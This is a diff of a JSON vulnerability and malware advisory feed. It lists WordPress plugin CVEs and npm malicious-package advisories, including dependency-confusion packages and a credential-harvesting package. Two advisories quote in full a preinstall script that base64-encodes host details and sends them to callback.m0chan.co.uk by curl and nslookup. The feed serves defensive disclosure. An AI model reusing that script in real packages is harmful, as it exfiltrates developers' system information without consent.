+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-108041"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/5776859a-d381-4e89-b263-4e22a74bfa83"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-106649",
+      "title": "The Kali Forms — Contact Form & Drag-and-Drop Builder WordPress plugin before 2.4.29 does not...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Kali Forms — Contact Form & Drag-and-Drop Builder WordPress plugin before 2.4.29 does not prevent users with author-level access and above from storing arbitrary JavaScript in a form button configuration, which is later output into a JavaScript execution context and runs in the browser session of any user who clicks the button, including an administrator.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-fcm8-mg9w-8fjh"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106649"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/b8602baf-33b2-46b2-98c7-7d29a393faf3"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-106000",
+      "title": "The Booking Package WordPress plugin before 1.7.34 does not require payment to be completed...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Booking Package WordPress plugin before 1.7.34 does not require payment to be completed before saving a booking on calendars configured to require online payment, allowing unauthenticated users to create confirmed bookings without paying.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-4297-h9g9-88r5"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106000"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/4a29bfc9-741e-417f-a382-ff9b77fb1571"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-111962",
+      "title": "The WP Remote Users Sync WordPress plugin before 2.2.0 does not adequately restrict access to the...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The WP Remote Users Sync WordPress plugin before 2.2.0 does not adequately restrict access to the user export files it writes beneath the public web root, relying on an Apache access-control file that other web servers such as Nginx ignore, which allows an unauthenticated attacker who requests the export's predictable file name while it is present to retrieve the exported users' personal data.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-wmc8-xv69-488r"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-111962"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/52800086-7013-4bd0-85f9-a2d94d3b6ab7"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-105191",
+      "title": "The ERP: Complete HR, Accounting & CRM Suite Built for WooCommerce WordPress plugin before 1.17...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The ERP: Complete HR, Accounting & CRM Suite Built for WooCommerce WordPress plugin before 1.17.11 does not perform a capability check on an AJAX action that returns the stored before-and-after values of a record change, allowing any authenticated user, including Subscribers, to read other users' sensitive HR, CRM and Accounting data by enumerating record identifiers.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-6vcx-gwjm-xrg8"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-105191"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/e9d5db8d-5eac-404e-ac29-847689af0d53"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-112243",
+      "title": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Duplicator WordPress plugin before 5.1.0, duplicator-pro WordPress plugin before 5.1.0 does not sanitise and escape a parameter before reflecting it on one of its administrative pages in certain configurations, leading to Reflected Cross-Site Scripting that executes in the session of a logged-in administrator who is tricked into opening a crafted link.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-4347-wh28-8rhq"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112243"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/402cdca7-e775-4895-808a-f161a7899114"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-108067",
+      "title": "The FV Flowplayer Video Player WordPress plugin before 7.5.56.7212 does not properly verify...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The FV Flowplayer Video Player WordPress plugin before 7.5.56.7212 does not properly verify record ownership before modifying or deleting stored video and meta records, allowing authenticated users with Contributor-level access and above to modify or delete arbitrary records belonging to other users, and to disclose the associated meta data in the response.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-cwrh-6w94-5384"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-108067"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/46aca27e-580a-4bb6-895c-dae238629d4f"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-101165",
+      "title": "The Mollie Payments for WooCommerce WordPress plugin before 8.2.0 does not verify an order's...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Mollie Payments for WooCommerce WordPress plugin before 8.2.0 does not verify an order's payment state or the requested payment gateway before removing a configured payment-surcharge fee, allowing unauthenticated users to reduce an order's total before completing payment.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-j7f4-8r42-xxhj"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101165"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/035680b1-abc7-41a7-90e1-e0d053fccf30"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-104719",
+      "title": "The CookieYes WordPress plugin before 3.5.8 does not correctly restrict who can write its cookie...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The CookieYes WordPress plugin before 3.5.8 does not correctly restrict who can write its cookie-category script fields, and does not sanitize or escape them, allowing users with the Contributor role to store JavaScript that executes in the browsers of site visitors and of an administrator reviewing the content.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-q9vr-qv9h-hj5f"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104719"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/fd1e087e-99b2-4942-82ee-44160ad77151"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-101166",
+      "title": "The Mollie Payments for WooCommerce WordPress plugin before 8.2.0 does not verify a product's...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Mollie Payments for WooCommerce WordPress plugin before 8.2.0 does not verify a product's publication status before creating an order for it through its PayPal express-checkout endpoint, allowing unauthenticated users to order draft or unpublished products.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-gw66-w4f9-383p"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101166"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/67794161-4243-4587-819c-7ee53f920fa2"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-105413",
+      "title": "The Form Maker by 10Web WordPress plugin before 1.15.51 does not consistently escape user...",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Form Maker by 10Web WordPress plugin before 1.15.51 does not consistently escape user-submitted field values before rendering them on its submissions admin page, allowing unauthenticated users to store a payload that executes as arbitrary web scripts in the session of an administrator who views the submissions.",
+      "affected": "Affected product/version range is not stated in the structured record. Check vendor advisory.",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub unreviewed advisory",
+          "url": "https://github.com/advisories/GHSA-p2mv-xr7j-g3mm"
+        },
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-105413"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wpscan.com/vulnerability/d992e80b-5c69-44ea-8dcc-7c8d2768115f"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "GitHub unreviewed advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:33:04Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-556m-xfwj-7wff",
+      "title": "Malicious code in @ifasn/ms-doc-mcp (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "## Source: amazon-inspector (89e10b57cd0911868969f2eaaa148e203d93745c5873d17c19e92ecec24d903d) Package advertises itself as a Markdown toolkit MCP server (TOC generation, word count, table formatting) but its main/bin entry unconditionally invokes an imdsAudit() routine at module load that probes the Alibaba Cloud instance metadata service at http://100.100.100.200. The enumeration includes RAM and IAM security-credentials endpoints (/latest/meta-data/ram/security-credentials/ and /latest/meta-data/iam/security-credentials/) using both v1 unauthenticated and v2 token-authenticated access paths, which on Alibaba Cloud return temporary role-scoped access keys. Harvested results, which can include live IAM credentials, instance-id, hostname, vpc-id, and private-ipv4, are written to stdout and to output/imds_audit.txt. Because this runs under an MCP server the stdout stream is the transport channel back to the MCP client/model, exposing the credentials beyond the local host. Code comments frame the behavior as a benign 'audit' with 'zero network return', which conflicts with both the package's declared Markdown-tooling purpose and the actual destination of the harvested data. Cloud credential enumeration is unrelated to any documented functionality of a Markdown toolkit. --- Credit: ",
+      "affected": "npm: @ifasn/ms-doc-mcp (= 2.0.9); npm: @ifasn/ms-doc-mcp (= 2.1.1)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-556m-xfwj-7wff"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/c836b73df621552df062f8d4176408f1cce9e347/osv/malicious/npm/@ifasn/ms-doc-mcp/MAL-2026-18603.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@ifasn/ms-doc-mcp/v/2.0.9"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/@ifasn/ms-doc-mcp/v/2.1.1"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:57Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-qmwf-4v39-cr83",
+      "title": "Malicious code in @atfm/utils (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "@atfm/utils@99.99.99 is a dependency confusion package: it uses an inflated version under the @atfm scope so that a build resolving an internal @atfm package of the same name picks the public one instead. Its package.json declares a preinstall script that runs on npm install. The script base64-encodes the installing user, hostname, current working directory and package name and sends them to a subdomain of callback.m0chan.co.uk in two ways: an HTTPS GET with the encoded data in the URL path, and a DNS lookup with the encoded package name as a subdomain label. The preinstall script is: ``` b64=$(printf '%s' \"$(whoami):$(hostname):$(pwd):$npm_package_name\" | base64 -w0); pkgsub=$(printf '%s' \"$npm_package_name\" | sed 's/@//g; s|/|-|g'); pkgdns=$(printf '%s' \"$npm_package_name\" | base64 -w0 | tr '+/' '-_' | tr -d '='); curl -sm5 https://$pkgsub.callback.m0chan.co.uk/$b64; nslookup $pkgdns.$pkgsub.callback.m0chan.co.uk ``` The same script appears in @atfm/utils and @atfm/atfm-material-ui, both at 99.99.99, and in other packages already listed in this database that call back to callback.m0chan.co.uk. Both @atfm packages have since been removed from npm. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/f561c611b",
+      "affected": "npm: @atfm/utils (= 99.99.99)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-qmwf-4v39-cr83"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/f561c611b1df1be5a6116381b4c54f7d8f9681e3/osv/malicious/npm/@atfm/utils/MAL-2026-18602.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:53Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-qwpw-cwrq-333j",
+      "title": "Malicious code in @ubedsockets/baileys (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "Malicious package. `@ubedsockets/baileys` is a trojanized fork of the Baileys WhatsApp library (@whiskeysockets/baileys). On connection it issues an authenticated `w:mex` newsletter FOLLOW mutation (query_id 7871414976211147) that silently subscribes every victim to attacker-controlled WhatsApp channels — hardcoded newsletter JIDs: 120363410154606795@newsletter, 120363423295236859@newsletter. Legitimate Baileys never hardcodes a channel JID or auto-follows on connect; all published versions are malicious. Detected by wormsign static analysis of the injected channel-subscription code. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/6282ccd01cbcaeab639c2217d5515a4869847d8b/osv/malicious/npm/@ubedsockets/baileys/MAL-2026-18600.json))",
+      "affected": "npm: @ubedsockets/baileys (> 0); npm: @ubedsockets/baileys (= 1.0.0); npm: @ubedsockets/baileys (= 1.1.0); npm: @ubedsockets/baileys (= 1.2.0); npm: @ubedsockets/baileys (= 1.3.0); npm: @ubedsockets/baileys (= 1.4.0); npm: @ubedsockets/baileys (= 1.5.0); npm: @ubedsockets/baileys (= 1.6.1); npm: @ubedsockets/baileys (= 1.6.2); npm: @ubedsockets/baileys (= 1.6.3); npm: @ubedsockets/baileys (= 1.6.4); npm: @ubedsockets/baileys (= 1.6.5); npm: @ubedsockets/baileys (= 1.6.6); npm: @ubedsockets/baileys (= 1.6.7); npm: @ubedsockets/baileys (= 1.6.8); npm: @ubedsockets/baileys (= 1.6.9); npm: @ubedsockets/baileys (= 1.7.0); npm: @ubedsockets/baileys (= 1.7.1); npm: @ubedsockets/baileys (= 1.7.10); npm: @ubedsockets/baileys (= 1.7.11); npm: @ubedsockets/baileys (= 1.7.12); npm: @ubedsockets/baileys (= 1.7.2); npm: @ubedsockets/baileys (= 1.7.3); npm: @ubedsockets/baileys (= 1.7.5); npm: @ubedsockets/baileys (= 1.7.6); npm: @ubedsockets/baileys (= 1.7.7); npm: @ubedsockets/baileys (= 1.7.9)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-qwpw-cwrq-333j"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/6282ccd01cbcaeab639c2217d5515a4869847d8b/osv/malicious/npm/@ubedsockets/baileys/MAL-2026-18600.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://wormsign.io/portfolio/@ubedsockets/baileys"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:53Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-6qhw-f3p4-49mg",
+      "title": "Malicious code in @atfm/atfm-material-ui (npm)",
+      "severity": "bulletin",
+      "categories": [
+        "Node.js / npm",
+        "Application dependencies"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "@atfm/atfm-material-ui@99.99.99 is a dependency confusion package: it uses an inflated version under the @atfm scope so that a build resolving an internal @atfm package of the same name picks the public one instead. Its package.json declares a preinstall script that runs on npm install. The script base64-encodes the installing user, hostname, current working directory and package name and sends them to a subdomain of callback.m0chan.co.uk in two ways: an HTTPS GET with the encoded data in the URL path, and a DNS lookup with the encoded package name as a subdomain label. The preinstall script is: ``` b64=$(printf '%s' \"$(whoami):$(hostname):$(pwd):$npm_package_name\" | base64 -w0); pkgsub=$(printf '%s' \"$npm_package_name\" | sed 's/@//g; s|/|-|g'); pkgdns=$(printf '%s' \"$npm_package_name\" | base64 -w0 | tr '+/' '-_' | tr -d '='); curl -sm5 https://$pkgsub.callback.m0chan.co.uk/$b64; nslookup $pkgdns.$pkgsub.callback.m0chan.co.uk ``` The same script appears in @atfm/utils and @atfm/atfm-material-ui, both at 99.99.99, and in other packages already listed in this database that call back to callback.m0chan.co.uk. Both @atfm packages have since been removed from npm. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blo",
+      "affected": "npm: @atfm/atfm-material-ui (= 99.99.99)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-6qhw-f3p4-49mg"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/f561c611b1df1be5a6116381b4c54f7d8f9681e3/osv/malicious/npm/@atfm/atfm-material-ui/MAL-2026-18601.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:32:52Z",
+      "source_type": "github",
+      "known_exploited": false
+    },
+    {
+      "id": "CVE-2026-118422",
+      "title": "The Stape Conversion Tracking WordPress plugin before 2.3.11 does not validate the sub-path appended to its same-origin proxy's upstream endpoint, allowing unauthenticated vis",
+      "severity": "bulletin",
+      "categories": [
+        "WordPress / Plugins"
+      ],
+      "published": "2026-11-04",
+      "updated": "2026-11-04",
+      "summary": "The Stape Conversion Tracking WordPress plugin before 2.3.11 does not validate the sub-path appended to its same-origin proxy's upstream endpoint, allowing unauthenticated visitors to redirect the server-side request to an arbitrary host and have the response body and its content type returned from the site's own origin with security response headers stripped, leading to Server-Side Request Forgery, including loopback and internal hosts, and Cross-Site Scripting.",
+      "affected": "Confirm affected versions from the vendor advisory and NVD CPE configurations.",
+      "remediation": "Review the linked vendor bulletin for patched versions and mitigations. This feed does not infer a fixed version.",
+      "action": "Verify applicability against the installed product and version, then follow vendor remediation instructions.",
+      "sources": [
+        {
+          "label": "NVD CVE record",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-118422"
+        }
+      ],
+      "exploitation": "Not confirmed by this source; check CISA KEV",
+      "kind": "cve",
+      "cvss": null,
+      "status": "NVD indexed CVE",
+      "first_seen_at": "2026-11-04T07:30:00Z",
+      "source_updated_at": "2026-11-04T06:17:03.070",
+      "source_type": "nvd",
+      "known_exploited": false
+    },
+    {
       "id": "GHSA-v25g-rj4q-4q96",
       "title": "Malware in nulio-connector",
       "severity": "bulletin",
@@ -1143,6 +2432,48 @@
       "first_seen_at": "2026-11-03T21:56:58Z",
       "source_updated_at": "2026-11-04T05:18:30.940",
       "source_type": "nvd",
+      "known_exploited": false
+    },
+    {
+      "id": "GHSA-qvhq-m873-hq8g",
+      "title": "Malicious code in service-roles-registry (npm)",
+      "severity": "bulletin",
+      "categories": [
+        ".NET / ASP.NET",
+        "Application dependencies",
+        "Node.js / npm"
+      ],
+      "published": "2026-11-03",
+      "updated": "2026-11-04",
+      "summary": "## Source: amazon-inspector (4b228283b1cc1ad44b34a38d3ca79fb5b3f14d278ff50447b1b631cfd4fab9e0) service-roles-registry@99.0.2 runs index.js as a preinstall script. On npm install, index.js reads os.hostname(), os.userInfo().user, process.cwd(), and package metadata and POSTs them over HTTPS to the hardcoded endpoint https://eog6t9e6egptozp.m.pipedream.net. The version number (99.0.2) and name shape are consistent with a dependency-confusion lure intended to win resolution against an internal package of the same name. Installation causes host identifiers of the installing machine or build system to be transmitted to a third-party collector with no consent, documentation, or opt-out. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/e42d117776998fa48d6eb4956bfaba9e434b902b/osv/malicious/npm/service-roles-registry/MAL-2026-18519.json))",
+      "affected": "npm: service-roles-registry (= 99.0.2); npm: service-roles-registry (= 99.0.1)",
+      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
+      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
+      "sources": [
+        {
+          "label": "GitHub malware advisory",
+          "url": "https://github.com/advisories/GHSA-qvhq-m873-hq8g"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/e42d117776998fa48d6eb4956bfaba9e434b902b/osv/malicious/npm/service-roles-registry/MAL-2026-18519.json"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://www.npmjs.com/package/service-roles-registry/v/99.0.2"
+        },
+        {
+          "label": "Additional advisory",
+          "url": "https://github.com/ossf/malicious-packages/blob/46f3617ed44a560ec03be9059e055445dbe56652/osv/malicious/npm/service-roles-registry/MAL-2026-18519.json"
+        }
+      ],
+      "exploitation": "Malicious software distribution advisory; investigate exposure",
+      "kind": "advisory",
+      "cvss": null,
+      "status": "GitHub malware advisory",
+      "first_seen_at": "2026-11-03T10:04:41Z",
+      "source_updated_at": "2026-11-04T06:32:52Z",
+      "source_type": "github",
       "known_exploited": false
     },
     {
@@ -4019,44 +5350,6 @@
       "status": "GitHub malware advisory",
       "first_seen_at": "2026-11-03T10:04:41Z",
       "source_updated_at": "2026-11-03T10:01:58Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
-      "id": "GHSA-qvhq-m873-hq8g",
-      "title": "Malicious code in service-roles-registry (npm)",
-      "severity": "bulletin",
-      "categories": [
-        ".NET / ASP.NET",
-        "Application dependencies",
-        "Node.js / npm"
-      ],
-      "published": "2026-11-03",
-      "updated": "2026-11-03",
-      "summary": "## Source: amazon-inspector (4b228283b1cc1ad44b34a38d3ca79fb5b3f14d278ff50447b1b631cfd4fab9e0) service-roles-registry@99.0.2 runs index.js as a preinstall script. On npm install, index.js reads os.hostname(), os.userInfo().user, process.cwd(), and package metadata and POSTs them over HTTPS to the hardcoded endpoint https://eog6t9e6egptozp.m.pipedream.net. The version number (99.0.2) and name shape are consistent with a dependency-confusion lure intended to win resolution against an internal package of the same name. Installation causes host identifiers of the installing machine or build system to be transmitted to a third-party collector with no consent, documentation, or opt-out. --- Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/e42d117776998fa48d6eb4956bfaba9e434b902b/osv/malicious/npm/service-roles-registry/MAL-2026-18519.json))",
-      "affected": "npm: service-roles-registry (= 99.0.2)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
